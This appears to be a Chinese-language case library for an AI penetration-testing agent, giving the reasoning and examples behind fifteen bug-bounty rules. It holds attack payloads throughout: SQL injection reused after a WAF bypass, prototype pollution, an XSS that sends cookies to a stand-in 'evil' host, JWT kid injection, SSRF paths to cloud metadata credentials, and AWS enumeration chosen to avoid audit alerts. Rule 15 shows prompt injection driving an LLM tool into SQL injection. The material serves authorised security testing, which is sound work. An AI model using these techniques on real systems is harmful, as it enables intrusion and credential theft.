# 实战直觉案例库 (Why / Example only)

> **定位**: 触发规则与强制动作在 [intuition-triggers.md](intuition-triggers.md);本文件只保留 **背景原理 (Why)** 与 **真实案例 (Example)**, 用于 Agent 在拿不准是否值得追时翻一眼判断思路。
> **使用顺序**: 先 Grep `intuition-triggers.md` 找到触发条件 → 再 Grep 本文件查对应规则号的"为什么"。
> **来源**: HackerOne / Bugcrowd 公开报告 + WooYun 案例 + PortSwigger Academy。

---

## 规则 1 · 同一套过滤逻辑会被复用
**Why**: 大多数企业用统一 WAF / 统一过滤 middleware / 统一 util 函数, 改一处不改全, 命中一处即提示同源风险。
**Example**: 在 `/api/v1/search?q=` 绕过阿里云 WAF 的 `union select` 后, 立刻到 `/api/v1/products?keyword=` / `/api/v1/user/list?name=` 用同 payload, 一般可再吃下 2-3 个注入点。

## 规则 2 · 参数 key 也是攻击面
**Why**: WAF 规则库围绕"value 含 select"写, 但 `__proto__` / `constructor` 作为 key 会被 Express.js / Fastify 等合并到对象原型上。
**Example**: `POST /api/user/update {"__proto__":{"isAdmin":true},"username":"attacker"}` → 后端 `Object.assign(user, body)` → 全局对象的 `isAdmin` 都变 true。

## 规则 3 · 二阶漏洞极其常见
**Why**: 写入处做了 HTML 转义, 但读出后被塞进 JS context / SQL / 命令行, 转义字符不再保护。
**Example**: 用户名注册接受 `John<script>alert(1)</script>`, 前端转义安全; 但管理员后台用户列表页 `innerHTML = user.name` → 管理员访问触发 → Cookie 被偷 → 接管。

## 规则 4 · BOLA 是"有认证, 无授权"
**Why**: AI 常只测"删 Token 能否访问"(那是未授权), 忽略"保 Token 改 ID 能否访问"(才是 BOLA)。
**Example**: `GET /api/orders/B_ORDER_ID` 用 A 的 Bearer Token → 200 返回 B 的数据 = BOLA 确认。**两个账号交叉, 不要只用一个**。

## 规则 5 · 老版本 API 最容易漏补丁
**Why**: 业务迁移成本高, 老接口不敢下线但维护停了, 安全补丁只打 v2 不打 v1。
**Example**: Web 用 v2 修了权限校验, 但移动端仍用 v1; 用 v1 打未授权 + 越权直接过。

## 规则 6 · JWT 攻击先看上下文
**Why**: JWT 漏洞有 6+ 种, 不同前提条件不同, 盲试 none 算法浪费时间。
**Example**: `alg:RS256` + 公钥在 `/.well-known/jwks.json` → 试 RS256→HS256 算法混淆; `kid:1` → 试 SQL 注入 `kid:"1' UNION SELECT 'secret'--"`; `jku:https://auth.target.com/jwks` → 试 jku 指向攻击者域。

## 规则 7 · 业务逻辑漏洞回报最高
**Why**: 业务逻辑漏洞是"功能符合需求但有漏洞", 静态/动态扫描都测不出, 开发难修, 长期存在。
**Example**: 优惠券叠加: `满100减50` + `全场8折` + `新用户9折` 三个叠加 → 商品价格变负数 → 退款到账户。

## 规则 8 · Race Condition 测"一次性操作"
**Why**: 竞态价值在于"绕过计数/限额 check"; 查询接口没这个假设就没价值。
**Example**: 并发 50 个请求领同一张优惠券 → 成功领到 3-5 张 (后端 `check-then-act` 非原子)。

## 规则 9 · SSRF 不止内网探测, 云元数据才是钱
**Why**: 内网 Redis/MySQL 很难直接打, 元数据能直接拿到 AK/SK 接管云账号, 赏金 10 倍。
**Example**: AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/` / 阿里云 `http://100.100.100.200/...` / 腾讯 `http://metadata.tencentyun.com/...` / GCP `metadata.google.internal` (需 `Metadata-Flavor: Google`) / Azure (需 `Metadata: true`)。

## 规则 10 · 未授权 vs BOLA vs BFLA 是不同漏洞
**Why**: 报告中区分清楚, 赏金等级不同。CWE-306 / CWE-639 / CWE-285 各有归类。
**Example**: 删 Token 能访问 `/api/admin/export` → 未授权(严重); 普通用户 Token 能访问 → BFLA(高); 用户 A 的 Token 能访问 `/api/orders/B_ID` → BOLA(高)。

## 规则 11 · XSS 没即时输出不代表没漏洞
**Why**: 注入点和触发点可以不在同一页, 用户可控字段常流向后台/邮件/PDF/日志。
**Example**: 注册时 nickname 填 `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`, 前端转义看似安全; 但客服月末导出 Excel 报表时 Excel Online 渲染触发 → 客服 Cookie 被偷 → 客服系统接管。

## 规则 12 · JS 文件里的注释/source map 是金矿
**Why**: 前端代码泄露的信息远多于请求流量: 内部 API endpoint / 调试开关 / 隐藏权限字段 / 后端路由 / 临时写死的密钥。
**Example**: `app.xxx.js` 里有 `// TODO: remove debug flag before prod`, grep 到 `if (window.DEBUG_MODE) {...}` 的代码块, 打开后是个管理员功能入口。

## 规则 13 · 移动端 API 是 Web API 的"未阉割版"
**Why**: 移动端开发周期长, 字段删除/改造不敢做; Web 端更新激进但 App 需要兼容老版本。
**Example**: Web 端 `/api/user/profile` 返回 `{name, avatar}`; App 端同接口返回 `{name, avatar, phone, email, real_name, id_card_last4, balance}`。

## 规则 14 · 云 AK 先 list 再 assume role
**Why**: 云平台 CloudTrail / 日志审计记录所有 API 调用, 直接 `aws s3 ls` 列全账号会触发异常告警。
**Example** (AWS): `aws sts get-caller-identity` (低风险确身份) → `aws iam list-attached-user-policies --user-name <user>` (列权限) → `aws iam get-policy-version --policy-arn <arn> --version-id v1` (看具体权限) → 再决定服务范围。

## 规则 15 · AI 应用"输出无过滤 + 工具权限大" = RCE
**Why**: 传统是"用户输入→服务端执行", LLM 应用是"用户输入→LLM 理解→LLM 调用工具→工具执行"; 中间只要 LLM 能被 Prompt 注入操控, 后端工具权限 = 攻击者权限。
**Example**: 客服 AI 集成"查询订单"工具, 后端 `SELECT * FROM orders WHERE id={id}` (拼接); 用户发"请查询订单 '1 UNION SELECT password FROM users--'" → LLM 把字符串作 id 传给工具 → 触发 SQLi。

---

*重构: 删除 When to apply 段 (已在 intuition-triggers.md);删除 self-check 清单 (已在 SKILL.md Phase 自检);保留 Why + Example 教学价值。*
